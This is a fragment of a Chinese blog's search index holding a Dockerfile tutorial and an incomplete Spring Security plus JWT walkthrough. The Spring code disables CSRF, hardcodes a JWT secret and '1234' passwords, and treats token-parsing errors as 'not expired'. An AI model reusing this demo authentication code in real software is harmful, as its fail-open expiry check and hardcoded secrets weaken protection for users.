build -t demo:v1.0 . 启动容器 # 前台启动刚构建的 SpringBoot 容器 # -p 映射容器8080端口 到宿主机的 8080 上 docker run -p 8080:8080 demo:v1.0 测试 访问 Linux 的8080 端口，注意替换为自己的 Linux 的地址，并开放 8080 端口 http://192.168.43.161:8080/hello\nbuild context Dockerfile 默认会使用它自己所在的目录作为 context，通过 docker 执行构建命令后，Docker daemon 会拷贝 context 目录下的所有文件，所以 context 目录不要放置项目无关的文件，或者可以使用 .dockerignore 定义忽略文件，也可以指定 context 路径\n# build 命令通过 Dockerfile 构建镜像 # 指定 ~/dockerfile 为 build context docker build ~/dockerfile # 不需要添加文件到 context 可以使用 - docker build - 可以通过 stdin 的方式，避免生产 Dockerfile 文件，直接 build 镜像\ndocker build -t myimage:latest -\u0026lt;\u0026lt;EOF FROM busybox RUN echo \u0026#34;hello world\u0026#34; EOF 除了可以指定 context外，还可以通过-f 指定 Dockerfile 所在的路径\ndocker build -f dockerfiles/Dockerfile . 最佳实践 非常推荐官方的 Dockerfile最佳实践：Best practices for writing Dockerfiles\n每个容器单一职责，有利于横向拓展和复用 旧版强调减少层数以提高性能，现在只有 RUN, COPY, ADD 这几个命令会创建层，其他命令只会创建中间层。并且只有使用到资源最终会被拷贝到最终镜像 多个参数按字母顺序排列，并使用空格和 \\ 进行分割，提高可读性 --no-cache 不使用缓存，默认 build 过程中如果检查到有可重用的镜像层则使用。从基础镜像开始，每一条命令逐一检查，如果命令不一样则缓存失效。使用 ADD 和 COPY 则会校验使用到的文件校验和是否相同，除了这两个命令，其他则不会通过文件变化来决定是否匹配缓存，而是仅通过命令本身是否一致来判断是否匹配缓存，比如：RUN apt-get -y update会改变容器内的文件，但是也只使用这个命令匹配缓存，而不会通过文件的变动。一旦缓存失效，后续都会产生新的镜像层 Dockerfile 指令 (instructions) FROM Dockerfile 的第一个命令一般都是 FROM，通过这个指定该镜像的 Base Image，推荐基础镜像：alpine，因为它完整且轻量，如果不需要 Base Image 可以用 FROM scratch，代表该镜像基于一个空镜像进行构建\nRUN 由于上面提到的缓存匹配原则，RUN apt-get update 命令可能会导致直接使用了原来缓存的镜像层，而没有执行该命令获取最新的软件列表，可以使用 RUN apt-get update \u0026amp;\u0026amp; apt-get install -y 来使缓存失效 可以使用 \\ 分割，提高可读性：\nRUN apt-get update \u0026amp;\u0026amp; apt-get install -y \\ curl CMD 指定容器启动时运行的命令，通常默认采用的格式：CMD [\u0026quot;executable\u0026quot;, \u0026quot;param1\u0026quot;, \u0026quot;param2\u0026quot;…]，如：\nCMD [\u0026#34;perl\u0026#34;, \u0026#34;-de0\u0026#34;] 这样使用 docker run -it 命令进入容器时，就会默认进入 shell 界面\nEXPOSE 指定容器需要监听的端口\nENV 可以使用 ENV 更新 PATH 环境变量，例如\nENV PATH=/usr/local/nginx/bin:$PATH 注意！每一个 ENV 指令都会创建一个新的中间层 (intermediate layer)，如果使用 ENV 设置了变量，在未来的层 unset 了变量，那么它在 unset 之前依然是可用的。为了防止这种情况，我们应该用 RUN 进行环境变量的 设置和取消\nENV ADMIN_USER=\u0026#34;mark\u0026#34; RUN echo $ADMIN_USER \u0026gt; ./mark RUN unset ADMIN_USER ADD or COPY 两个命令功能相似，优先使用COPY，它的作用只是将本地文件拷贝到容器内，而 ADD 则有其他特性，比如：自动将本地 tar 文件提取到镜像中、远程URL 如果多个步骤需要使用不同的文件，应该单独 COPY，而不是一次性 COPY，这样部分文件变化不会导致所有的缓存都失效 避免使用 ADD 通过 URL 获取包，可以使用 curl 或者 wget，这样可以在提取后删除文件，避免镜像多一层，还可以通过管道，就不需要再手动删除中间文件\nRUN mkdir -p /usr/src/things \\ \u0026amp;\u0026amp; curl -SL https://example.com/big.tar.xz \\ | tar -xJC /usr/src/things \\ \u0026amp;\u0026amp; make -C /usr/src/things all ENTRYPOINT 使用 ENTRYPOINT 设置主命令，还可以用 CMD 设置默认的可选参数\nENTRYPOINT [\u0026#34;s3cmd\u0026#34;] CMD [\u0026#34;--help\u0026#34;] 运行编译镜像，指定名称为：s3cmd，运行容器\ndocker run s3cmd 默认会运行 s3cmd 并带上 --help 参数，即：显示该命令的帮助\n运行下面命令：\ndocker run s3cmd ls s3://mybucket ls s3://mybucket 会覆盖默认可选参数 --help\n如果需要覆盖 ENTRYPOINT，需要使用 --entrypoint 参数\nVOLUME 暴露镜像中可变和用户可修改的数据，比如：存储文件、配置文件，比如：\nVOLUME /data 设置的目录会在容器运行时自动挂载为匿名卷，如果没有设置，就会写入容器存储层\nUSER 如果不需要使用 sudo ，可以通过 USER 切换到非 root 用户，例如：\nRUN groupadd -r postgres \u0026amp;\u0026amp; useradd --no-log-init -r -g postgres postgres WORKDIR WORKDIR 指令可以来指定工作目录，不存在会自动创建 Dockerfile 不同于 Shell，下面的命令其实是不同的层，第一条的 cd 不会影响第二条命令，最终运行结束会导致在 /app 下找不到 world.txt 文件\nRUN cd /app RUN echo \u0026#34;hello\u0026#34; \u0026gt; world.txt 应该使用：\nWORKDIR /app RUN echo \u0026#34;hello\u0026#34; \u0026gt; world.txt 参考资料 使用 Dockerfile 定制镜像\n利用构建缓存机制缩短Docker镜像构建时间\nDockerfile: ENTRYPOINT和CMD的区别\n上一节：Docker 实践及命令梳理 下一节：IDEA 配合 Dockerfile 部署 SpringBoot 工程\n","permalink":"https://aaronlinv.github.io/posts/dockerfile-%E5%AE%9E%E8%B7%B5%E5%8F%8A%E6%A2%B3%E7%90%86/","summary":"\u003cp\u003e上一节：\u003ca href=\"https://www.cnblogs.com/aaronlinv/p/15130730.html\"\u003eDocker 实践及命令梳理\u003c/a\u003e\n下一节：\u003ca href=\"https://www.cnblogs.com/aaronlinv/p/15228488.html\"\u003eIDEA 配合 Dockerfile 部署 SpringBoot 工程\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003eDockerfile 是一个文本文件，我们可以通过组合一条条的指令 (Instruction)，来构建满足我们需求的 Docker 镜像\u003c/p\u003e\n\u003ch2 id=\"文档\"\u003e文档\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://docs.docker.com/develop/develop-images/dockerfile_best-practices/\"\u003eBest practices for writing Dockerfiles\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://docs.docker.com/engine/reference/builder/\"\u003eReference\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://yeasy.gitbook.io/docker_practice/image/dockerfile\"\u003eDockerfile 指令详解\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"简单上手\"\u003e简单上手\u003c/h2\u003e\n\u003cp\u003e使用 Dockerfile 构建SpringBoot 工程的镜像\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e新建 SpringBoot 项目，默认的端口是 8080 ，新建 Controller 和 Mapping\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nd\"\u003e@RestController\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eHelloController\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nd\"\u003e@GetMapping\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;hello\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eString\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nf\"\u003ehello\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;hello world!\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e启动项目，访问 http://localhost:8080/hello 测试\u003c/p\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e打 jar 包\n注意，需要在 pom 中添加 spring-boot-maven-plugin 插件，否则运行 jar 包时会提示：没有主清单属性\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;build\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nt\"\u003e\u0026lt;plugins\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nt\"\u003e\u0026lt;plugin\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nt\"\u003e\u0026lt;groupId\u0026gt;\u003c/span\u003eorg.springframework.boot\u003cspan class=\"nt\"\u003e\u0026lt;/groupId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nt\"\u003e\u0026lt;artifactId\u0026gt;\u003c/span\u003espring-boot-maven-plugin\u003cspan class=\"nt\"\u003e\u0026lt;/artifactId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nt\"\u003e\u0026lt;/plugin\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nt\"\u003e\u0026lt;/plugins\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;/build\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#打包\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emvn package\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003etarget 目录下就可以找到 .jar 文件，我这里的文件名为：demo-0.0.1-SNAPSHOT.jar\n在 Linux 新建 \u003ccode\u003e~/springboot\u003c/code\u003e 文件夹，并将 jar 包上传到这个文件夹下\u003c/p\u003e","title":"Dockerfile 实践及梳理"},{"content":"文档 Spring Security Reference SpringBoot+SpringSecurity+jwt整合及初体验 JSON Web Token 入门教程 - 阮一峰 JWT 官网\nSpringSecurity 项目 GitHub 仓库地址：https://github.com/aaronlinv/springsecurity-jwt-demo\n依赖 主要用到了: SpringSecurity,Thymeleaf,Web,Lombok\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-security\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-thymeleaf\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.projectlombok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lombok\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependency\u0026gt; 页面 编写页面和 Controller 进行测试，具体页面可以看 代码 主要包含了首页(index)，订单(order)，还有 user,role,menu这三个位于 /system 下，需要 admin 权限\n使用内存用户进行表单登录 在 static 下新建 login.html，用于登录\n\u0026lt;form action=\u0026#34;/login\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;username\u0026#34;\u0026gt;账户\u0026lt;/label\u0026gt;\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;label for=\u0026#34;password\u0026#34;\u0026gt;密码\u0026lt;/label\u0026gt;\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;登录\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 编写继承 WebSecurityConfigurerAdapter 的 Security 配置类，并开启 @EnableWebSecurity 注解，这个注解包含了 @Configuration WebSecurityConfigurerAdapter 中有两个方法，它们名称相同，但是入参不同\nprotected void configure(HttpSecurity http) throws Exception protected void configure(AuthenticationManagerBuilder auth) throws Exception 入参为 HttpSecurity 的 configure 可以配置拦截相关的参数 另一个入参为 AuthenticationManagerBuilder，则是用来配置验证相关的参数\n@EnableWebSecurity // @Configuration 被包括在上面的注解了 public class SecurityConfig extends WebSecurityConfigurerAdapter { @Bean // 配置 PasswordEncoder 用于密码的加密和匹配 public PasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(); } @Override protected void configure(HttpSecurity http) throws Exception { // http // 配置表单登录相关参数 .formLogin() // 登录页面 .loginPage(\u0026#34;/login.html\u0026#34;) // 表单提交的地址 .loginProcessingUrl(\u0026#34;/login\u0026#34;) // 登录成功后跳转的地址 .defaultSuccessUrl(\u0026#34;/index\u0026#34;) // .and() 方法返回的是 HttpSecurity 对象 .and() // 配置权限相关参数 .authorizeRequests() // 匹配路径 // 需要开放登录的地址，否则访问登录页面时因为没有权限，自动跳转到登录页，进入死循环，导致报错：重定向的次数过多 .antMatchers(\u0026#34;/login.html\u0026#34;, \u0026#34;/login\u0026#34;) // 允许访问 .permitAll() // 匹配路径 .antMatchers(\u0026#34;/order\u0026#34;) // 必须有指定的任意权限才能访问 .hasAnyAuthority(\u0026#34;ROLE_user\u0026#34;, \u0026#34;ROLE_admin\u0026#34;) // 匹配 /system 下的所有路径 .antMatchers(\u0026#34;/system/**\u0026#34;) // 拥有指定角色才能访问 .hasRole(\u0026#34;admin\u0026#34;) // 除了上面的路径，其他都需要认证 .anyRequest().authenticated() // 返回 HttpSecurity 对象 .and() // 关闭 csrf （跨站请求伪造） .csrf().disable(); // 设置 注销地址 http.logout().logoutUrl(\u0026#34;/logout\u0026#34;); } @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { // 配置验证 // 使用内存（非持久化）验证 auth.inMemoryAuthentication() // 配置用户名 .withUser(\u0026#34;user\u0026#34;) // 配置用 PasswordEncoder 加密后的密码 .password(passwordEncoder().encode(\u0026#34;1234\u0026#34;)) // 配置角色 .roles(\u0026#34;user\u0026#34;) .and() .withUser(\u0026#34;admin\u0026#34;) .password(passwordEncoder().encode(\u0026#34;1234\u0026#34;)) .roles(\u0026#34;admin\u0026#34;) .and() // 配置授权时默认使用的 PasswordEncoder .passwordEncoder(passwordEncoder()); ; } } 具体代码参考 这里 两个 configure 非常类似，入参对象的方法中包含了具体的配置项，如：formLogin,authorizeRequests,csrf,logout 等等，部分配置项还可以通过链式调用，进行该配置项更详细地配置，通过 .and() 可以回到 HttpSecurity 对象，再定义其他配置项\n使用表单的方式登录需要配置：表单 (formLogin)、授权(authorizeRequests) 、跨站请求伪造(csrf)、注销(logout)，还需要配置验证，先使用最简单的 inMemoryAuthentication，并指定账户密码，再指定密码编码器\n然后启动服务，访问登录页面（注意这里的被修改为 8081），输入不同的账号密码，测试不同页面的访问情况，没有权限会提示：403 http://localhost:8081/login.html\n使用 Json 传递参数，自定义 Handler 修改登录页面，使用 Ajax 向后端传递 账户和密码，需要使用 POST\n\u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;登录\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;/login\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;username\u0026#34;\u0026gt;账户\u0026lt;/label\u0026gt;\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;label for=\u0026#34;password\u0026#34;\u0026gt;密码\u0026lt;/label\u0026gt;\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; onclick=\u0026#34;login()\u0026#34; value=\u0026#34;登录\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script\u0026gt; function login() { $.ajax({ type: \u0026#34;POST\u0026#34;, url: \u0026#34;/login\u0026#34;, data: { \u0026#34;username\u0026#34;: $(\u0026#34;#username\u0026#34;).val(), \u0026#34;password\u0026#34;: $(\u0026#34;#password\u0026#34;).val(), }, success: function (data) { if (data.code == 20001) { Location.href = \u0026#34;/index\u0026#34;; } else { alert(data.msg); } } }) } \u0026lt;/script\u0026gt; 需要编写登录成功和登录失败时调用的 Handler，并配置到SecurityConfig 中\n@Component public class MyAuthenticationFailureHandler implements AuthenticationFailureHandler { @Override public void onAuthenticationFailure(HttpServletRequest request, HttpServletResponse response, AuthenticationException exception) throws IOException, ServletException { response.setContentType(\u0026#34;application/json; charset=UTF-8\u0026#34;); PrintWriter writer = response.getWriter(); writer.write(\u0026#34;{\\\u0026#34;code\\\u0026#34;:\\\u0026#34;40001\\\u0026#34;,\\\u0026#34;msg\\\u0026#34;:\\\u0026#34;登录失败\\\u0026#34;}\u0026#34;); writer.flush(); writer.close(); } } @Component public class MyAuthenticationSuccessHandler implements AuthenticationSuccessHandler { @Override public void onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException { response.setContentType(\u0026#34;application/json; charset=UTF-8\u0026#34;); PrintWriter writer = response.getWriter(); writer.write(\u0026#34;{\\\u0026#34;code\\\u0026#34;:\\\u0026#34;20001\\\u0026#34;,\\\u0026#34;msg\\\u0026#34;:\\\u0026#34;登录成功\\\u0026#34;}\u0026#34;); writer.flush(); writer.close(); } } 在 SecurityConfig 中 注入并配置 Handler\n@Autowired private AuthenticationSuccessHandler successHandler; @Autowired private AuthenticationFailureHandler failureHandler; @Override protected void configure(HttpSecurity http) throws Exception { http.formLogin() .loginPage(\u0026#34;/login.html\u0026#34;) .loginProcessingUrl(\u0026#34;/login\u0026#34;) // 指定 Handler .successHandler(successHandler) .failureHandler(failureHandler) // 省略其他代码... } 具体代码参考 这里 登录页面进行测试：http://localhost:8081/login.html 首页:http://localhost:8081/\n基于数据库的认证 创建数据库 jwt_demo ，导入表数据：sql 脚本 users 表，包括字段：user_id,user_name,password,status,roles 导入 MySQL 驱动和 JPA 的依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;runtime\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-data-jpa\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 在 application.properties 中配置数据库信息\nserver.port=8081 spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver spring.datasource.username=root spring.datasource.password=1234 spring.datasource.url=jdbc:mysql://localhost:3306/jwt_demo?serverTimezone=GMT%2B8\u0026amp;characterEncoding=utf-8 UserDetails 接口是 SpringSecurity 用来承载用户信息的载体，SpringSecurity 提供了对这个接口的实现类：org.springframework.security.core.userdetails.User，我们自己定义的用户类通常也叫User，所以导包时候要注意使用 我们自己定义的 User 类\n@Entity @Table(name = \u0026#34;users\u0026#34;) @Data @AllArgsConstructor @NoArgsConstructor public class User implements UserDetails { @Id @GeneratedValue(strategy = GenerationType.IDENTITY) @Column private Long userId; @Column(name = \u0026#34;user_name\u0026#34;) private String userName; @Column(name = \u0026#34;password\u0026#34;) private String password; @Column(name = \u0026#34;status\u0026#34;) private String status; @Column(name = \u0026#34;roles\u0026#34;) private String roles; // 对象的权限列表，不需要持久化 @Transient private List\u0026lt;GrantedAuthority\u0026gt; authorities; public void setAuthorities(List\u0026lt;GrantedAuthority\u0026gt; authorities) { this.authorities = authorities; } // 必须重写接口的对于 getPassword,getUsername,getAuthorities 等方法 @Override public Collection\u0026lt;? extends GrantedAuthority\u0026gt; getAuthorities() { return this.authorities; } @Override public String getUsername() { return this.userName; } // 下面 4 个需要方法 return true，否则登录时会被限制 @Override public boolean isAccountNonExpired() { return true; } @Override public boolean isAccountNonLocked() { return true; } @Override public boolean isCredentialsNonExpired() { return true; } @Override public boolean isEnabled() { return true; } } 定义 JPA 的 Repository\n@Repository public interface UserDao extends JpaRepository\u0026lt;User, Long\u0026gt; { } 定义 Service\npublic interface UserService { public User selectUserByUserName(String username); } 定义 Service 对应的实现，通过查询用户名获得用户相关信息\n@Service public class UserServiceImpl implements UserService { @Autowired private UserDao userDao; @Override public User selectUserByUserName(String username) { User user = new User(); user.setUserName(username); List\u0026lt;User\u0026gt; list = userDao.findAll(Example.of(user)); return list.isEmpty() ? null : list.get(0); } } 还需要编写 UserDetailService，供 SpringSecurity 的 DaoAuthenticationProvider 类中的 retrieveUser 方法调用，以此获得对应用户的信息\n@Service public class UserDetailService implements UserDetailsService { @Autowired private UserService userService; @Override public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException { // 调用 Service User user = userService.selectUserByUserName(username); if (user == null) { throw new UsernameNotFoundException(\u0026#34;用户\u0026#34; + user.getUsername() + \u0026#34;不存在\u0026#34;); } // 设置权限 // commaSeparatedStringToAuthorityList 方式将字符串间通过 \u0026#39;,\u0026#39; 进行分割，然后返回 List user.setAuthorities(AuthorityUtils.commaSeparatedStringToAuthorityList(user.getRoles())); return user; } } // 省略其他... public class SecurityConfig extends WebSecurityConfigurerAdapter { @Autowired private UserDetailService userDetailService; @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { // 将内存授权方式替换为自己实现的 UserDetailService auth.userDetailsService(userDetailService) .passwordEncoder(passwordEncoder()); // 省略其他... } 具体代码参考 这里\n登录页面进行测试：http://localhost:8081/login.html 首页:http://localhost:8081/\n整合 JWT 添加 jjwt 依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.jsonwebtoken\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jjwt\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.9.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 在 application.properties 中配置 JWT 参数\ntoken.header:Authorization # 令牌秘钥 token.secret:askdhfkjahskjdfhkalsjhdf^112asdfasdf44^%$_@+asdfasdfaskjdhfkjashdfljkahsdklsfjasgdkjfgjahs(IS:)_@@+asdfasdfaskjdhfkjashdfljkahsdklsfja@+asdfasdfaskjdhfkjashdfljkahsdklsfjasgdkjfgjahssgdkjfgjahsdgfjhgsdfsadf+-asdfasdas+as++_sdfsdsasdfasdf # 令牌有效期（默认30分钟） token.expireTime:3600000 定义统一 API 封装格式\npublic class RestResult extends HashMap\u0026lt;String, Object\u0026gt; { private static final long serialVersionUID = 1L; // 状态码 public static final String CODE_TAG = \u0026#34;code\u0026#34;; // 返回内容 public static final String MSG_TAG = \u0026#34;msg\u0026#34;; // 数据对象 public static final String DATA_TAG = \u0026#34;data\u0026#34;; public RestResult() { } public RestResult(int code, String msg) { super.put(CODE_TAG, code); super.put(MSG_TAG, msg); } public RestResult(int code, String msg, Object data) { super.put(CODE_TAG, code); super.put(MSG_TAG, msg); if (data != null) { super.put(DATA_TAG, data); } } public static RestResult success() { return new RestResult(200, \u0026#34;成功\u0026#34;); } } 然后准备 JWT 工具类，实现：生成 token、从 token 中获取用户名、检查 token 是否过期、刷新 token、验证 token 等，这里的 KEY 通过双重锁 保证了线程安全\n@Data @Component @Slf4j public class JwtTokenUtils { @Value(\u0026#34;${token.secret}\u0026#34;) private String secret; @Value(\u0026#34;${token.expireTime}\u0026#34;) private Long expiration; @Value(\u0026#34;${token.header}\u0026#34;) private String header; private static Key KEY = null; /** * 生成token令牌 * * @param userDetails 用户 * @return 令token牌 */ public String generateToken(UserDetails userDetails) { log.info(\u0026#34;[JwtTokenUtils] generateToken \u0026#34; + userDetails.toString()); Map\u0026lt;String, Object\u0026gt; claims = new HashMap\u0026lt;\u0026gt;(2); claims.put(\u0026#34;sub\u0026#34;, userDetails.getUsername()); claims.put(\u0026#34;created\u0026#34;, new Date()); return generateToken(claims); } /** * 从令牌中获取用户名 * * @param token 令牌 * @return 用户名 */ public String getUsernameFromToken(String token) { String username = null; try { Claims claims = getClaimsFromToken(token); username = claims.get(\u0026#34;sub\u0026#34;, String.class); log.info(\u0026#34;从令牌中获取用户名:\u0026#34; + username); } catch (Exception e) { username = null; } return username; } /** * 判断令牌是否过期 * * @param token 令牌 * @return 是否过期 */ public Boolean isTokenExpired(String token) { try { Claims claims = getClaimsFromToken(token); Date expiration = claims.getExpiration(); return expiration.before(new Date()); } catch (Exception e) { return false; } } /** * 刷新令牌 * * @param token 原令牌 * @return 新令牌 */ public String refreshToken(String token) { String refreshedToken; try { Claims claims = getClaimsFromToken(token); claims.put(\u0026#34;created\u0026#34;, new Date()); refreshedToken = generateToken(claims); } catch (Exception e) { refreshedToken = null; } return refreshedToken; } /** * 验证令牌 * * @param token 令牌 * @param userDetails 用户 * @return 是否有效 */ public Boolean validateToken(String token, UserDetails userDetails) { String username = getUsernameFromToken(token); return (username.equals(userDetails.getUsername()) \u0026amp;\u0026amp; !isTokenExpired(token)); } /** * 从claims生成令牌 * * @param claims 数据声明 * @return 令牌 */ private String generateToken(Map\u0026lt;String, Object\u0026gt; claims) { Date expirationDate = new Date(System.currentTimeMillis() + expiration); return Jwts.builder().setClaims(claims) .setExpiration(expirationDate) .signWith(SignatureAlgorithm.HS256, getKeyInstance()) .compact(); } /** * 从令牌中获取数据声明 * * @param token 令牌 * @return 数据声明 */ private Claims getClaimsFromToken(String token) { Claims claims = null; try { claims = Jwts.parser().setSigningKey(getKeyInstance()).parseClaimsJws(token).getBody(); } catch (Exception e) { claims = null; } return claims; } private Key getKeyInstance() { if (KEY == null) { 